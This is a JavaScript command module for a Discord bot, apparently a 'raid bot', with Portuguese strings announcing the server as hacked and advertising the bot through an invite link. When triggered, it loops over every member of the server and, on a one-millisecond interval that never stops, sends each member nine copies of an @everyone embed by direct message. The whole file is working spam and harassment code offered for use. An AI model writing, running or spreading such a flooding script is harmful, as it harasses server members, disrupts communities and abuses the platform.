const discord = require("discord.js");

exports.run = async (client, message) => {
   let Title = "Hackeado Por Gustavo33"
    let Description = "@everyone @everyone @everyone @everyone @everyone @everyone"
    let field = "Quer Ter Esse Bot De Raid?:"
    let fieldd = "Acesse Este Servidor: https://discord.gg/x9jqsb" // descricão do field
   const embed = new discord.RichEmbed()
   .setTitle(Title)
   .setColor("RANDOM")
   .setDescription(Description)
   .setImage("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
   .addField(field, fieldd)
   const embed0 = new discord.RichEmbed()
   .setTitle(Title)
   .setColor("RANDOM")
   .setDescription(Description)
   .setImage("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
   .addField(field, fieldd)
   const embed1 = new discord.RichEmbed()
   .setTitle(Title)
   .setColor("RANDOM")
   .setDescription(Description)
   .setImage("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
   .addField(field, fieldd)
   client.guilds.get(message.guild.id).members.forEach(m => {
     setInterval(() => {
     m.send(embed)
     m.send(embed0)
     m.send(embed1)
     m.send(embed)
     m.send(embed0)
     m.send(embed1)
     m.send(embed)
     m.send(embed0)
     m.send(embed1)
     }, 1)
   })
}